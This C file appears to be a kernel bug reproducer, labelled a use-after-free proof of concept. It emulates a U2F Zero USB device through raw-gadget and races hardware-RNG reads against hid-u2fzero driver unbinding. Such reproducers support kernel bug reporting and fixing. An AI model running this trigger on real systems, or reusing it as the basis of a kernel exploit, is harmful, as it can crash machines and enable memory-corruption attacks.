// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <unistd.h>

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	uint8_t driver_name[UDC_NAME_LENGTH_MAX];
	uint8_t device_name[UDC_NAME_LENGTH_MAX];
	uint8_t speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	uint32_t type;
	uint32_t length;
	uint8_t data[0];
};

struct usb_raw_ep_io {
	uint16_t ep;
	uint16_t flags;
	uint32_t length;
	uint8_t data[0];
};

#define USB_RAW_EPS_NUM_MAX 30
#define USB_RAW_EP_NAME_MAX 16
#define USB_RAW_EP_ADDR_ANY 0xff

struct usb_raw_ep_caps {
	uint32_t type_control : 1;
	uint32_t type_iso : 1;
	uint32_t type_bulk : 1;
	uint32_t type_int : 1;
	uint32_t dir_in : 1;
	uint32_t dir_out : 1;
};

struct usb_raw_ep_limits {
	uint16_t maxpacket_limit;
	uint16_t max_streams;
	uint32_t reserved;
};

struct usb_raw_ep_info {
	uint8_t name[USB_RAW_EP_NAME_MAX];
	uint32_t addr;
	struct usb_raw_ep_caps caps;
	struct usb_raw_ep_limits limits;
};

struct usb_raw_eps_info {
	struct usb_raw_ep_info eps[USB_RAW_EPS_NUM_MAX];
};

struct usb_endpoint_descriptor_full {
	uint8_t bLength;
	uint8_t bDescriptorType;
	uint8_t bEndpointAddress;
	uint8_t bmAttributes;
	uint16_t wMaxPacketSize;
	uint8_t bInterval;
	uint8_t bRefresh;
	uint8_t bSynchAddress;
} __attribute__((packed));

#define USB_RAW_IOCTL_INIT        _IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN         _IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE   _IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ    _IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE   _IOW('U', 5, struct usb_endpoint_descriptor_full)
#define USB_RAW_IOCTL_EP_DISABLE  _IOW('U', 6, uint32_t)
#define USB_RAW_IOCTL_EP_WRITE    _IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ     _IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE   _IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW   _IOW('U', 10, uint32_t)
#define USB_RAW_IOCTL_EPS_INFO    _IOR('U', 11, struct usb_raw_eps_info)
#define USB_RAW_IOCTL_EP0_STALL   _IO('U', 12)

struct usb_ctrlrequest {
	uint8_t bRequestType;
	uint8_t bRequest;
	uint16_t wValue;
	uint16_t wIndex;
	uint16_t wLength;
} __attribute__((packed));

#define USB_DIR_IN  0x80

#define USB_TYPE_MASK     (0x03 << 5)
#define USB_TYPE_STANDARD (0x00 << 5)
#define USB_TYPE_CLASS    (0x01 << 5)

#define USB_RECIP_MASK      0x1f
#define USB_RECIP_INTERFACE 0x01

#define USB_REQ_GET_DESCRIPTOR    0x06
#define USB_REQ_SET_CONFIGURATION 0x09
#define USB_REQ_GET_INTERFACE     0x0A
#define USB_REQ_SET_INTERFACE     0x0B

#define USB_DT_DEVICE     0x01
#define USB_DT_CONFIG     0x02
#define USB_DT_HID        0x21
#define USB_DT_HID_REPORT 0x22

#define HID_REQ_GET_REPORT 0x01
#define HID_REQ_SET_REPORT 0x09
#define HID_REQ_SET_IDLE   0x0A

#define USB_SPEED_HIGH 3

#define U2FZERO_VID 0x10c4
#define U2FZERO_PID 0x8acf

static void logmsg(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf) - 2, fmt, ap);
	va_end(ap);
	if (n < 0)
		return;
	if (n > (int)sizeof(buf) - 2)
		n = sizeof(buf) - 2;
	buf[n++] = '\n';
	buf[n] = 0;
	write(1, buf, n);
}

static int write_file(const char *path, const char *val)
{
	int fd, ret;

	fd = open(path, O_WRONLY);
	if (fd < 0)
		return -1;
	ret = write(fd, val, strlen(val));
	close(fd);
	return ret < 0 ? -1 : 0;
}

static int read_file(const char *path, char *buf, size_t len)
{
	int fd, ret;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return -1;
	ret = read(fd, buf, len - 1);
	close(fd);
	if (ret < 0)
		return -1;
	buf[ret] = 0;
	return ret;
}

static const uint8_t dev_desc[18] = {
	18,
	USB_DT_DEVICE,
	0x00, 0x02,
	0x00,
	0x00,
	0x00,
	64,
	U2FZERO_VID & 0xff, U2FZERO_VID >> 8,
	U2FZERO_PID & 0xff, U2FZERO_PID >> 8,
	0x00, 0x01,
	0x00,
	0x00,
	0x00,
	0x01,
};

static const uint8_t report_desc[] = {
	0x06, 0xd0, 0xf1,
	0x09, 0x01,
	0xa1, 0x01,
	0x09, 0x20,
	0x15, 0x00,
	0x26, 0xff, 0x00,
	0x75, 0x08,
	0x95, 0x40,
	0x81, 0x02,
	0x09, 0x21,
	0x15, 0x00,
	0x26, 0xff, 0x00,
	0x75, 0x08,
	0x95, 0x40,
	0x91, 0x02,
	0xc0
};

#define CFG_TOTAL 41
static uint8_t cfg_desc[CFG_TOTAL];

static uint8_t ep_in_addr, ep_out_addr;

static void build_config_desc(void)
{
	uint8_t *p = cfg_desc;
	uint16_t rlen = sizeof(report_desc);

	*p++ = 9;
	*p++ = USB_DT_CONFIG;
	*p++ = CFG_TOTAL & 0xff;
	*p++ = CFG_TOTAL >> 8;
	*p++ = 1;
	*p++ = 1;
	*p++ = 0;
	*p++ = 0x80;
	*p++ = 0x32;

	*p++ = 9;
	*p++ = 0x04;
	*p++ = 0;
	*p++ = 0;
	*p++ = 2;
	*p++ = 0x03;
	*p++ = 0x00;
	*p++ = 0x00;
	*p++ = 0;

	*p++ = 9;
	*p++ = USB_DT_HID;
	*p++ = 0x11;
	*p++ = 0x01;
	*p++ = 0x00;
	*p++ = 0x01;
	*p++ = USB_DT_HID_REPORT;
	*p++ = rlen & 0xff;
	*p++ = rlen >> 8;

	*p++ = 7;
	*p++ = 0x05;
	*p++ = ep_in_addr;
	*p++ = 0x03;
	*p++ = 0x40;
	*p++ = 0x00;
	*p++ = 4;

	*p++ = 7;
	*p++ = 0x05;
	*p++ = ep_out_addr;
	*p++ = 0x03;
	*p++ = 0x40;
	*p++ = 0x00;
	*p++ = 4;
}

struct ep0_io {
	struct usb_raw_ep_io inner;
	uint8_t data[512];
};

struct ep_io {
	struct usb_raw_ep_io inner;
	uint8_t data[128];
};

static int rawfd = -1;
static volatile int g_configured;
static volatile int g_ep_in_handle = -1, g_ep_out_handle = -1;
static volatile int g_gadget_dead;

static int ep0_write(const void *data, uint32_t len)
{
	struct ep0_io io;

	io.inner.ep = 0;
	io.inner.flags = 0;
	io.inner.length = len;
	if (len)
		memcpy(io.data, data, len);
	return ioctl(rawfd, USB_RAW_IOCTL_EP0_WRITE, &io);
}

static int ep0_read(uint32_t len)
{
	struct ep0_io io;

	io.inner.ep = 0;
	io.inner.flags = 0;
	io.inner.length = len > sizeof(io.data) ? sizeof(io.data) : len;
	return ioctl(rawfd, USB_RAW_IOCTL_EP0_READ, &io);
}

static int g_dbg;
static struct usb_ctrlrequest g_ctrl;

static int ep0_reply(const void *data, uint32_t len)
{
	int r;

	if ((g_ctrl.bRequestType & USB_DIR_IN) && g_ctrl.wLength) {
		if (len > g_ctrl.wLength)
			len = g_ctrl.wLength;
		r = ep0_write(data, len);
	} else {
		r = ep0_read(g_ctrl.wLength);
	}
	if (r < 0 && g_dbg)
		logmsg("[-] ep0 reply failed: errno=%d", errno);
	return r;
}

static void enable_endpoints(void)
{
	struct usb_endpoint_descriptor_full d;
	int h;

	memset(&d, 0, sizeof(d));
	d.bLength = 7;
	d.bDescriptorType = 0x05;
	d.bEndpointAddress = ep_in_addr;
	d.bmAttributes = 0x03;
	d.wMaxPacketSize = 64;
	d.bInterval = 4;
	h = ioctl(rawfd, USB_RAW_IOCTL_EP_ENABLE, &d);
	if (h < 0)
		logmsg("[-] EP_ENABLE in failed: errno=%d", errno);
	else
		logmsg("[+] EP_ENABLE in  -> handle %d", h);
	g_ep_in_handle = h;

	memset(&d, 0, sizeof(d));
	d.bLength = 7;
	d.bDescriptorType = 0x05;
	d.bEndpointAddress = ep_out_addr;
	d.bmAttributes = 0x03;
	d.wMaxPacketSize = 64;
	d.bInterval = 4;
	h = ioctl(rawfd, USB_RAW_IOCTL_EP_ENABLE, &d);
	if (h < 0)
		logmsg("[-] EP_ENABLE out failed: errno=%d", errno);
	else
		logmsg("[+] EP_ENABLE out -> handle %d", h);
	g_ep_out_handle = h;
}

static void *ep_in_thread(void *unused)
{
	struct ep_io io;

	(void)unused;
	while (!g_gadget_dead) {
		if (g_ep_in_handle < 0) {
			usleep(1000);
			continue;
		}
		memset(&io, 0, sizeof(io));
		io.inner.ep = g_ep_in_handle;
		io.inner.flags = 0;
		io.inner.length = 64;
		memset(io.data, 0x41, 64);

		io.data[0] = 0xff; io.data[1] = 0xff;
		io.data[2] = 0xff; io.data[3] = 0xff;
		io.data[4] = 0x21;
		io.data[5] = 0x00;
		io.data[6] = 0x08;
		if (ioctl(rawfd, USB_RAW_IOCTL_EP_WRITE, &io) < 0)
			usleep(2000);
	}
	return NULL;
}

static void *ep_out_thread(void *unused)
{
	struct ep_io io;

	(void)unused;
	while (!g_gadget_dead) {
		if (g_ep_out_handle < 0) {
			usleep(1000);
			continue;
		}
		memset(&io, 0, sizeof(io));
		io.inner.ep = g_ep_out_handle;
		io.inner.flags = 0;
		io.inner.length = 64;
		if (ioctl(rawfd, USB_RAW_IOCTL_EP_READ, &io) < 0)
			usleep(2000);
	}
	return NULL;
}

static void handle_control(struct usb_ctrlrequest *ctrl)
{
	uint8_t type = ctrl->bRequestType & USB_TYPE_MASK;
	uint8_t recip = ctrl->bRequestType & USB_RECIP_MASK;
	uint8_t desc_type = ctrl->wValue >> 8;
	uint8_t zeros[64];

	g_ctrl = *ctrl;
	if (g_dbg)
		logmsg("    ctrl %02x %02x val=%04x idx=%04x len=%u",
		       ctrl->bRequestType, ctrl->bRequest, ctrl->wValue,
		       ctrl->wIndex, ctrl->wLength);

	if (type == USB_TYPE_STANDARD) {
		switch (ctrl->bRequest) {
		case USB_REQ_GET_DESCRIPTOR:
			switch (desc_type) {
			case USB_DT_DEVICE:
				ep0_reply(dev_desc, sizeof(dev_desc));
				return;
			case USB_DT_CONFIG:
				ep0_reply(cfg_desc, CFG_TOTAL);
				return;
			case USB_DT_HID:

				ep0_reply(cfg_desc + 18, 9);
				return;
			case USB_DT_HID_REPORT:
				ep0_reply(report_desc, sizeof(report_desc));
				return;
			default:
				break;
			}
			break;
		case USB_REQ_SET_CONFIGURATION:
			enable_endpoints();
			if (ioctl(rawfd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
				logmsg("[-] CONFIGURE failed: errno=%d", errno);
			ep0_reply(NULL, 0);
			g_configured = 1;
			logmsg("[+] gadget configured (ep_in=0x%02x ep_out=0x%02x)",
			       ep_in_addr, ep_out_addr);
			return;
		case USB_REQ_SET_INTERFACE:
			ep0_reply(NULL, 0);
			return;
		case USB_REQ_GET_INTERFACE:
			zeros[0] = 0;
			ep0_reply(zeros, 1);
			return;
		default:
			break;
		}
	} else if (type == USB_TYPE_CLASS && recip == USB_RECIP_INTERFACE) {
		switch (ctrl->bRequest) {
		case HID_REQ_SET_IDLE:
		case HID_REQ_SET_REPORT:
			ep0_reply(NULL, 0);
			return;
		case HID_REQ_GET_REPORT:
			memset(zeros, 0, sizeof(zeros));
			ep0_reply(zeros, sizeof(zeros));
			return;
		default:
			break;
		}
	}

	if (g_dbg)
		logmsg("    -> STALL");
	ioctl(rawfd, USB_RAW_IOCTL_EP0_STALL, 0);
}

static void *ep0_thread(void *unused)
{
	char buf[sizeof(struct usb_raw_event) + sizeof(struct usb_ctrlrequest)];
	struct usb_raw_event *ev = (struct usb_raw_event *)buf;

	(void)unused;
	while (!g_gadget_dead) {
		ev->type = 0;
		ev->length = sizeof(struct usb_ctrlrequest);
		if (ioctl(rawfd, USB_RAW_IOCTL_EVENT_FETCH, ev) < 0) {
			if (errno == EINTR)
				continue;
			logmsg("[-] EVENT_FETCH failed: errno=%d", errno);
			break;
		}
		if (ev->type == USB_RAW_EVENT_CONTROL)
			handle_control((struct usb_ctrlrequest *)ev->data);
		else if (ev->type == USB_RAW_EVENT_DISCONNECT)
			logmsg("[*] gadget disconnect event");
	}
	return NULL;
}

static int pick_endpoints(void)
{
	struct usb_raw_eps_info info;
	int n, i;
	int got_in = 0, got_out = 0;

	memset(&info, 0, sizeof(info));
	n = ioctl(rawfd, USB_RAW_IOCTL_EPS_INFO, &info);
	if (n < 0) {
		logmsg("[-] EPS_INFO failed: errno=%d", errno);
		return -1;
	}
	for (i = 0; i < n && (!got_in || !got_out); i++) {
		struct usb_raw_ep_info *e = &info.eps[i];

		if (!e->caps.type_int)
			continue;
		if (e->limits.maxpacket_limit < 64)
			continue;
		if (!got_in && e->caps.dir_in) {
			ep_in_addr = (e->addr == USB_RAW_EP_ADDR_ANY) ?
				(0x80 | 1) : (uint8_t)(0x80 | e->addr);
			got_in = 1;
			logmsg("[*] IN  ep: %s addr=0x%02x", e->name, ep_in_addr);
			continue;
		}
		if (!got_out && e->caps.dir_out) {
			ep_out_addr = (e->addr == USB_RAW_EP_ADDR_ANY) ?
				2 : (uint8_t)e->addr;
			got_out = 1;
			logmsg("[*] OUT ep: %s addr=0x%02x", e->name, ep_out_addr);
		}
	}
	if (!got_in || !got_out) {
		logmsg("[-] could not find int IN + int OUT endpoints");
		return -1;
	}
	return 0;
}

#define HID_DRV_DIR "/sys/bus/hid/drivers/hid-u2fzero"

static int find_hid_id(char *out, size_t len)
{
	DIR *d;
	struct dirent *e;
	int found = 0;

	d = opendir(HID_DRV_DIR);
	if (!d)
		return -1;
	while ((e = readdir(d))) {
		if (e->d_name[0] == '.')
			continue;
		if (!strchr(e->d_name, ':'))
			continue;
		snprintf(out, len, "%s", e->d_name);
		found = 1;
		break;
	}
	closedir(d);
	return found ? 0 : -1;
}

static int select_hwrng(void)
{
	char avail[1024];
	char *p, *sp;
	int i;

	avail[0] = 0;
	for (i = 0; i < 300; i++) {
		if (read_file("/sys/class/misc/hw_random/rng_available",
			      avail, sizeof(avail)) > 0 &&
		    strstr(avail, "u2fzero"))
			break;
		usleep(10000);
	}
	if (!strstr(avail, "u2fzero")) {
		logmsg("[-] u2fzero hwrng never showed up (avail='%s')", avail);
		return -1;
	}

	for (p = strtok_r(avail, " \n", &sp); p; p = strtok_r(NULL, " \n", &sp)) {
		if (strncmp(p, "u2fzero", 7))
			continue;
		if (write_file("/sys/class/misc/hw_random/rng_current", p) < 0) {
			logmsg("[-] failed to select rng '%s': errno=%d",
			       p, errno);
			return -1;
		}
		logmsg("[+] /dev/hwrng now sourced from '%s'", p);
		return 0;
	}
	return -1;
}

static volatile int g_reader_go;
static volatile int g_reader_stop;
static volatile unsigned long g_reads;

static void *reader_thread(void *unused)
{
	unsigned char b[32];
	int fd;

	(void)unused;
	while (!g_reader_stop) {
		if (!g_reader_go) {
			usleep(200);
			continue;
		}
		fd = open("/dev/hwrng", O_RDONLY);
		if (fd < 0) {
			usleep(1000);
			continue;
		}
		while (g_reader_go && !g_reader_stop) {
			if (read(fd, b, sizeof(b)) < 0)
				break;
			g_reads++;
		}
		close(fd);
	}
	return NULL;
}

static char g_hid_id[128];

static void *unbind_thread(void *unused)
{
	(void)unused;
	write_file(HID_DRV_DIR "/unbind", g_hid_id);
	return NULL;
}

int main(void)
{
	pthread_t t_ep0, t_in, t_out, t_rd[4], t_ub;
	struct usb_raw_init init;
	char buf[256];
	int i, iter;

	logmsg("=== hid-u2fzero dev->urb UAF PoC ===");
	g_dbg = 1;

	write_file("/proc/sys/kernel/printk", "7 4 1 7");
	write_file("/proc/sys/kernel/panic_on_warn", "1");

	if (access("/dev/hwrng", F_OK) != 0)
		mknod("/dev/hwrng", S_IFCHR | 0600, makedev(10, 183));

	rawfd = open("/dev/raw-gadget", O_RDWR);
	if (rawfd < 0) {
		logmsg("[-] open(/dev/raw-gadget) failed: errno=%d "
		       "(CONFIG_USB_RAW_GADGET missing?)", errno);
		return 1;
	}

	memset(&init, 0, sizeof(init));
	strcpy((char *)init.driver_name, "dummy_udc");
	strcpy((char *)init.device_name, "dummy_udc.0");
	init.speed = USB_SPEED_HIGH;
	if (ioctl(rawfd, USB_RAW_IOCTL_INIT, &init) < 0) {
		logmsg("[-] RAW_IOCTL_INIT failed: errno=%d", errno);
		return 1;
	}
	if (ioctl(rawfd, USB_RAW_IOCTL_RUN, 0) < 0) {
		logmsg("[-] RAW_IOCTL_RUN failed: errno=%d", errno);
		return 1;
	}
	logmsg("[+] raw-gadget bound to dummy_udc.0");

	if (pick_endpoints() < 0)
		return 1;
	build_config_desc();

	pthread_create(&t_ep0, NULL, ep0_thread, NULL);

	for (i = 0; i < 500 && !g_configured; i++)
		usleep(10000);
	if (!g_configured) {
		logmsg("[-] host never configured the gadget");
		return 1;
	}

	pthread_create(&t_in, NULL, ep_in_thread, NULL);
	pthread_create(&t_out, NULL, ep_out_thread, NULL);

	for (i = 0; i < 500; i++) {
		if (find_hid_id(g_hid_id, sizeof(g_hid_id)) == 0)
			break;
		usleep(10000);
	}
	if (!g_hid_id[0]) {
		logmsg("[-] hid-u2fzero never bound to the emulated device");
		return 1;
	}
	logmsg("[+] hid-u2fzero bound: %s", g_hid_id);

	if (read_file("/sys/class/leds/u2fzero0/max_brightness", buf,
		      sizeof(buf)) > 0)
		logmsg("[+] LED class device /sys/class/leds/u2fzero0 present");

	for (i = 0; i < 4; i++)
		pthread_create(&t_rd[i], NULL, reader_thread, NULL);

	for (iter = 0; iter < 20; iter++) {
		if (select_hwrng() < 0)
			break;

		if (iter == 0) {
			int fd = open("/dev/hwrng", O_RDONLY);

			if (fd >= 0) {
				unsigned char b[16];
				int r = read(fd, b, sizeof(b));

				logmsg("[+] /dev/hwrng read -> %d bytes "
				       "(u2fzero_rng_read reached)", r);
				close(fd);
			} else {
				logmsg("[-] open(/dev/hwrng): errno=%d", errno);
			}
		}

		g_reads = 0;
		g_reader_go = 1;
		usleep(120000);
		logmsg("[*] iter %d: %lu reads done, unbinding %s",
		       iter, g_reads, g_hid_id);

		pthread_create(&t_ub, NULL, unbind_thread, NULL);
		usleep(400000);
		g_reader_go = 0;
		pthread_join(t_ub, NULL);

		if (write_file(HID_DRV_DIR "/bind", g_hid_id) < 0) {
			logmsg("[-] rebind failed: errno=%d", errno);
			break;
		}
		usleep(100000);
		if (find_hid_id(g_hid_id, sizeof(g_hid_id)) < 0) {
			logmsg("[-] device gone after rebind");
			break;
		}
	}

	logmsg("[*] done, no crash");
	g_reader_stop = 1;
	g_gadget_dead = 1;
	usleep(200000);
	return 0;
}
